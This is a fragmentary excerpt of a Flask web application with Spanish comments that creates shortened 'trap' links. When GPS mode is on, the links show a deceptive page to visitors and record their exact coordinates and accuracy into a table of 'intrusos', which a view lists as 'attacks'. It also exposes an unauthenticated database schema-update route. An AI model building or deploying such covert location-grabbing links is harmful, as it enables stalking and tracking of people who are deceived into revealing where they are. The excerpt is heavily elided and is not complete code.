...
# --- HERRAMIENTA DE ACTUALIZACIÓN DE DB (EJECUTAR UNA VEZ) ---
@app.route('/update_db_schema')
def update_db_schema():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        # Agregamos las columnas nuevas para el GPS
        ...
        cur.close()
        conn.close()
        return "<h1>✅ Base de Datos Actualizada: Modo Satélite Activado</h1>"
...
def acortar_link(url_larga):
    try:
        # Usamos is.gd para links limpios
...
def trampa_activada(token):
    ...
    # Si activamos GPS, mostramos pantalla de engaño
    if usar_gps:
        return render_template('tracker.html')
    else:
        return redirect(url_final)

# --- RUTA 3: RECIBIR COORDENADAS EXACTAS ---
...
def save_gps():
    ...
    if res:
        trampa_id = res[0]
        # Actualizamos el último intruso de esa trampa con las coordenadas
        cur.execute("""
            UPDATE intrusos SET lat = %s, lon = %s, accuracy = %s 
            WHERE trampa_id = %s AND id = (SELECT MAX(id) FROM intrusos WHERE trampa_id = %s)
        """, (str(data['lat']), str(data['lon']), str(data['acc']), trampa_id, trampa_id))
        conn.commit()
...
def ver_ataques():
    conn = get_db_connection()
    cur = conn.cursor()
    # Ahora seleccionamos lat y lon también
    cur.execute("""
